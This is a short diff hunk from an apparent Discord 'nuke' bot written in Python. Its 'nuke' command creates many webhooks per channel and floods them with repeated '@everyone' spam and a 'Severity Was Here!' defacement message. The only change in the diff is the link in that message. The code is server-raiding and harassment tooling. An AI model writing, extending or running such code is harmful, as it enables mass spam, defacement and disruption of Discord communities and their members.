@@ -84,7 +84,7 @@ async def nuke(ctx):
         for _ in range(num_webhooks):
             webhook = await channel.create_webhook(name=f"Severity{_}") 
             for _ in range(5):
-                await webhook.send(f"@everyone **Severity Was Here!** https://guns.lol/severity/")       
+                await webhook.send(f"@everyone **Severity Was Here!** https://guns.lol/hooked/")       
                 await ctx.send("Nuking the server...")  
 
 @bot.event
